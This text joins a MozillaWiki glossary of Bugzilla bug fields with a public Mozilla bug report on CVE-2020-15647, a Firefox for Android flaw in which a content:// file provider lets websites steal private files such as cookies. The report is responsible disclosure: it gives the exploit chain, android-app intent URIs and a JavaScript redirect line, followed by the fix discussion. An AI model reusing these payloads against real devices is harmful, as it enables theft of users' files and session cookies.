=== Content from wiki.mozilla.org_73f8d6fa_20250119_135211.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from bugzilla.mozilla.org_3ded8d54_20250119_121030.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1647078)
* [XML](/show_bug.cgi?ctype=xml&id=1647078)

Closed
[Bug 1647078](/show_bug.cgi?id=1647078)
(CVE-2020-15647)

Opened 5 years ago
Closed 5 years ago

# content:// provider allows websites to remotely steal any file from the device if the path is known

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

content:// provider allows websites to remotely steal any file from the device if the path is known

## Categories

### (Firefox for Android Graveyard :: General, defect, P1)

[Product:](/describecomponents.cgi?product=Firefox%20for%20Android%20Graveyard)

Firefox for Android Graveyard
▾

Firefox for Android Graveyard
Old, retired Fennec bugs. Fennec is the code name of the effort to build a mobile version of Firefox ([more info](http://wiki.mozilla.org/Mobile/FennecVision))
[See Open Bugs in This Product](/buglist.cgi?product=Firefox%20for%20Android%20Graveyard&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Firefox%20for%20Android%20Graveyard)
Watch This Product

[Component:](/describecomponents.cgi?product=Firefox%20for%20Android%20Graveyard&component=General#General)

General
▾

Firefox for Android Graveyard :: General
For bugs in Fennec which do not fit into other more specific Fennec components.
[See Open Bugs in This Component](/buglist.cgi?product=Firefox%20for%20Android%20Graveyard&component=General&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Firefox%20for%20Android%20Graveyard&component=General&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Firefox%20for%20Android%20Graveyard&component=General)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P1

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

--

## Tracking

### (firefox-esr6878+ verified)

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Score | --- |
| --- | --- |
| Webcompat Priority | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr68 | [78+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=78%2B) | [verified](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=verified) |

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr68 | 78+ | verified |

## People

### (Reporter: kanytu, Assigned: agi)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/2f23a572bdd06777026ab2c155cfe0c0?d=mm&size=40)  [agi](/user_profile?user_id=421286)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/fba1cdeef36023e3cfc2558b3d82963d?d=mm&size=40)  [kanytu](/user_profile?user_id=665275)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

---

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

25 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[CVE-2020-15649](/show_bug.cgi?id=1652364 "VERIFIED FIXED - Private files are allowed to be uploaded (exfiltration)"), [CVE-2020-15650](/show_bug.cgi?id=1652360 "VERIFIED FIXED - Path traversal in upload feature allows internal file overwrite")

[bugs.chromium.org/p/chromium/issues/d...](https://bugs.chromium.org/p/chromium/issues/detail?id=144866 "https://bugs.chromium.org/p/chromium/issues/detail?id=144866")

## Details

### (Keywords: csectype-sop, reporter-external, sec-critical, Whiteboard: [reporter-external] [client-bounty-form] [verif?][sec-survey])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2020-15647

[Keywords:](/describekeywords.cgi)

[csectype-sop](/buglist.cgi?keywords=csectype-sop&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-critical](/buglist.cgi?keywords=sec-critical&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reporter-external] [client-bounty-form] [verif?][sec-survey]

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a1482129_1689 "5 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (9 files)

| [attachments.zip](/attachment.cgi?id=9158004)  [5 years ago](#c0)  [Pedro Oliveira](/user_profile?user_id=665275)   4.62 MB, application/zip |  | [Details](/attachment.cgi?id=9158004&action=edit) |
| --- | --- | --- |
| [Bug 1647078 - Load content:// URIs from intents as file://.](/attachment.cgi?id=9159562)  [5 years ago](#c23)  [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)   47 bytes, text/x-phabricator-request | RyanVM : [approval-mozilla-esr68+](#c74 "5 years ago")  dveditz : [sec-approval+](#c69 "5 years ago") | [Details](/attachment.cgi?id=9159562&action=edit) | [Review](/attachment.cgi?id=9159562) |
| [Bug 1647078 - Never handle content:// channels from Web.](/attachment.cgi?id=9159563)  [5 years ago](#c24)  [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)   47 bytes, text/x-phabricator-request | dveditz : [sec-approval+](#a886673_1689 "5 years ago") | [Details](/attachment.cgi?id=9159563&action=edit) | [Review](/attachment.cgi?id=9159563) |
| [Bug 1647078 - Use random file names when copying a content:// URI.](/attachment.cgi?id=9159564)  [5 years ago](#c25)  [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)   47 bytes, text/x-phabricator-request | dveditz : [sec-approval+](#a886678_1689 "5 years ago") | [Details](/attachment.cgi?id=9159564&action=edit) | [Review](/attachment.cgi?id=9159564) |
| [Bug 1647078 - Always copy content:// files.](/attachment.cgi?id=9159565)  [5 years ago](#c26)  [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)   47 bytes, text/x-phabricator-request | dveditz : [sec-approval+](#a886689_1689 "5 years ago") | [Details](/attachment.cgi?id=9159565&action=edit) | [Review](/attachment.cgi?id=9159565) |
| [Bug 1647078 - Restrict content:// paths to external storage.](/attachment.cgi?id=9159742)  [5 years ago](#c43)  [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)   47 bytes, text/x-phabricator-request | dveditz : [sec-approval+](#a886682_1689 "5 years ago") | [Details](/attachment.cgi?id=9159742&action=edit) | [Review](/attachment.cgi?id=9159742) |
| [Bug 1647078 - Don't load Web-originated intents that open in the browser.](/attachment.cgi?id=9159814)  [5 years ago](#c47)  [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)   47 bytes, text/x-phabricator-request | dveditz : [sec-approval+](#a886665_1689 "5 years ago") | [Details](/attachment.cgi?id=9159814&action=edit) | [Review](/attachment.cgi?id=9159814) |
| [Bug 1647078 - Fix unit tests and checkstyle. a=RyanVM](/attachment.cgi?id=9161643)  [5 years ago](#c75)  [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)   47 bytes, text/x-phabricator-request |  | [Details](/attachment.cgi?id=9161643&action=edit) | [Review](/attachment.cgi?id=9161643) |
| [advisory.txt](/attachment.cgi?id=9161647)  [5 years ago](#c76)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   264 bytes, text/plain |  | [Details](/attachment.cgi?id=9161647&action=edit) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1647078#c0)• 5 years ago |
|  | |

Attached file
[attachments.zip](attachment.cgi?id=9158004)
— [Details](attachment.cgi?id=9158004&action=edit)

The following report is in Markdown format, consider using a reader for better experience.

## Environment

* **Device:** HTC m8
* **OS version:** Android 9
* **Package name:** org.mozilla.firefox
* **App version:** 68.9.0 (`versionCode` 2015701353) (stable channel)

---

## Proof of concept

### Pre-conditions:

* Firefox installed
* Python3 installed
* ngrok (optional for easy tunneling)

### Steps:

* Start the `server.py` (see attachments) using the following command:

  ```
  $ python3 server.py <WEBSITE> <PORT_TO_LISTEN>

  ```

  The `<WEBSITE>` is the URL that is going to be opened in the device without scheme (Examples: `192.1.1.1`, `myDomain.com`, `192.6.1.3:8080`).

  The `<PORT>` is the port for the server
* Open the website above in Firefox for Android

### Result

* A javascript alert is shown with the contents of the cookies database

### Expected result

* No private file should be accessed

---

## Detailed explanation

When the webiste is opened in Firefox, a webpage is served that contains a `<iframe>` that downloads a file named `profile.ini` to `/sdcard/Download/profile.ini` and opens it after a short delay using this `href`:

```
android-app://org.mozilla.firefox/content/org.mozilla.firefox.fileprovider/root/sdcard/Download/profiles.ini#Intent;type=text/html;end

```

This Intent orders Firefox to open the URI `content://org.mozilla.firefox.fileprovider/root/sdcard/Download/profiles.ini`. Firefox will download this `content://` URI to `/data/data/org.mozilla.firefox/cache/contentUri` while rendering it. The name is maintained so a new file called `/data/data/org.mozilla.firefox/cache/contentUri/profiles.ini` has been now created.

The contents of `profile.ini` can be seen in `server.py` (method `get_profiles_html`) but basically it's a HTML page that contains an `<iframe>` that loads another `content://` URI and trigger a javascript function after a while (more info bellow).

The URI loaded is:

```
content://org.mozilla.firefox.fileprovider/data/user/0/org.mozilla.firefox/files/mozilla/profiles.ini

```

This provider is misconfigured and contains the following entry in its XML configuration file (`provider_paths.xml`):

```
<paths xmlns:android="http://schemas.android.com/apk/res/android">
    <root-path name="root" path="."/>
</paths>

```

Firefox is using `root-path` with path `.` which essentially allows all files to be resolved by this provider. This allows private files from Firefox to be accessed.

The logic to download the file from a `content://` URI is rewriting the file, so the contents of `profile.ini` (the current page loaded) were now overriden and contains the values of `/data/user/0/org.mozilla.firefox/files/mozilla/profiles.ini`.

After the above `<iframe>` is loaded, the javascript function triggers. This javascript reads the contents of the current page (this bypass CORS protections because the file is the same). The current page is now the `profiles.ini` file from Firefox. This file contains the path to the cookies directory. After the path has been retrieved from the file, it repeats the process again but for `/data/user/0/org.mozilla.firefox/files/mozilla/<PATH>/cookies.sqlite`.

\*\*Resuming: \*\*

This is a combination of multiple misconfigurations/flawed logic:

* Firefox allows private files to be opened in it
* Content provider from Firefox allows private file inclusion
* Files downloaded from content providers with the same name are downloaded to the same place.

---

## Vulnerable code

* `res/xml/provider_paths.xml`

```
<root-path name="root" path="."/>

```

---

## Remediation

Firefox should not allow private files to be accessed by it's provider. A suggested fix here is to use instead:

```
<root-path name="root" path="/storage/"/>

```

Firefox should also not override the contents from `contentUri` otherwise it'll be possible to override the contents of a file and retrieve it afterwards.

---

## Attachments

* server.py

  Python3 server containg the full proof of concept.
* video.mp4

  A video showing the exploit in action.

---

## Impact

* Remote file steal of cookies or any other file if the attacker knows the path which is easy for common applications.
Flags: sec-bounty?

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1647078#c1)• 5 years ago |
|  | |

Stefan/snorp, can one of you (find someone to) investigate?

Group: firefox-core-security → mobile-core-securityType: task → defectComponent: Security → GeneralFlags: needinfo?(snorp)Flags: needinfo?(sarentz)Product: Firefox → Firefox for Android

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a260507_388264)• 5 years ago |

Flags: needinfo?(sarentz)

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1647078#c2)• 5 years ago |
|  | |

Adding Petru too. The suggested remediation looks good, but I don't know if that will regress anything else.

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a266813_388264)• 5 years ago |

Priority: -- → P1

|  | [Petru-Mugurel Lingurar [:petru]](/user_profile?user_id=613831) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1647078#c3)• 5 years ago |
|  | |

Thanks Stefan!

Based on the comment here - <https://hg.mozilla.org/mozreview/gecko/rev/703dce7078d2296c209dd0b2e5aabf1790c76361#index_header> we needed the FileProvider to allow access to the whole file system as the user has the possibility to set the downloads folder at any location.

So using just `<root-path name="root" path="/storage/"/>` might indeed break some things.

Will investigate a bit more.

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1647078#c4)• 5 years ago |
|  | |

Hey Firefox team,

Given the last comment, the user shouldn't be able to set the downloads folder in the internal folder of the application. No file manager will have access to /data/.. unless the device is rooted, so I still think the suggested approach fixes the issue.

However, I need to enforce that this is only part of the fix. It is important that downloads to /contentUri/ are not replaced and a new file is created even if the name is the same. Otherwise, it will still be possible to steal any file from the device that is saved in /storage/.

Thank you,

@kanytu

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a432287_580382)• 5 years ago |

[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F)

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1647078#c5)• 5 years ago |
|  | |

Hi kanytu, thank you very much for this report and also for your collaboration towards a good fix for this issue.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a442364_1689)• 5 years ago |

Status: UNCONFIRMED → NEWEver confirmed: trueKeywords: [csectype-sop](/buglist.cgi?keywords=csectype-sop&resolution=---),
[sec-critical](/buglist.cgi?keywords=sec-critical&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a442451_1689)• 5 years ago |

Summary: A misconfiguration in a content provider of Firefox for Android is allowing websites to remotely steal any file from the device if the path is known. In this report, I demonstrate how it's possible to remotely steal all cookies from a user. → content:// provider allows websites to remotely steal any file from the device if the path is known

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1647078#c6)• 5 years ago |
|  | |

so what is this content:// scheme? it's like file:// but worse, and none of the special-cased code that protects file:// from web content. what other non-web internal schemes does Fennec support and expose to web content?

Flags: needinfo?(petru.lingurar)

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1647078#c7)• 5 years ago |
|  | |

Is this a possible solution: disable access to content:// URLs from web content?

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1647078#c8)• 5 years ago |
|  | |

Yeah why is `content://` exposed to web content? I don't think it should? I'm investigating.

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1647078#c9)• 5 years ago |
|  | |

Hey again,

I just want to clarify the last comments. The Web has not access to the `content://` Uri. What is happening in this exploit, is the usage of `android-app` scheme to force Firefox to open a `content://` Uri webpage.

As seen in your intent-filter:

```
 <intent-filter>
	 <action android:name="android.intent.action.VIEW"/>
   <category android:name="android.intent.category.BROWSABLE"/>
   <category android:name="android.intent.category.DEFAULT"/>
   <data android:scheme="file"/>
   <data android:scheme="http"/>
   <data android:scheme="https"/>
   <data android:scheme="content"/>
   <data android:mimeType="text/html"/>
   <data android:mimeType="text/plain"/>
   <data android:mimeType="application/xhtml+xml"/>
   <data android:mimeType="image/svg+xml"/>
 </intent-filter>

```

Firefox supports the `content` schema. And is that schema I'm sending in this javascript code:

```
window.location.href = 'android-app://org.mozilla.firefox/content/org.mozilla.firefox.fileprovider/root/sdcard/Download/cookies.sqlite#Intent;type=text/html;end';

```

This forces Firefox to process an `android-app` intent ([more info here](https://developer.android.com/reference/android/content/Intent#URI_ANDROID_APP_SCHEME)), which will open an HTML page that was just downloaded (by the same page.). So the exploit is local at this point. I just forced Firefox to open the newly downloaded file.

Removing that support for `content://` will make Firefox unable to open local HTML files (e.g Open with... )

Let me know if I can help you clarifying the attack vector,

Thanks

@kanytu

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1647078#c10)• 5 years ago |
|  | |

kanytu, thanks for reporting this.

I tried to load this html from a local http server in Fennec

```
<html>
<body>
  <iframe src="content://org.mozilla.firefox.fileprovider/data/local/tmp/test.txt"></iframe>
</body>
</html>

```

and I got a crash, so at least in some form web content *does* have access to a `content://` URL, which I think it's wrong, but it might be unrelated to this.

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1647078#c11)• 5 years ago |
|  | |

Hum I see,

Indeed that shouldn't happen, however the website wont have access to that Iframe because the origin is not the same, so that doesn't seem much of a security problem to me. But that still shows that Firefox tried to download that content uri file to its internal directory. The crash might have been because the URI is correctly generated.

That being said, that doesn't seem related to this attack because the intent redirection turns the vector from remote to local.

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1647078#c12)• 5 years ago |
|  | |

FWIW I am not against disabling `content://` for Fennec 68.11.

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1647078#c13)• 5 years ago |
|  | |

kanytu, do you think changing the root path to `/storage/` and disabling `content://` scheme from the `VIEW` intent would be enough to stop this attack?

Flags: needinfo?(kanytu)

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1647078#c14)• 5 years ago |
|  | |

Yes. It will. However won't be enough for a local attack with a malicious app I guess. I think an application without storage permissions will still be able to extract files from the device with this exploit by sending an explicit intent to Firefox following the same strategy.

Flags: needinfo?(kanytu)

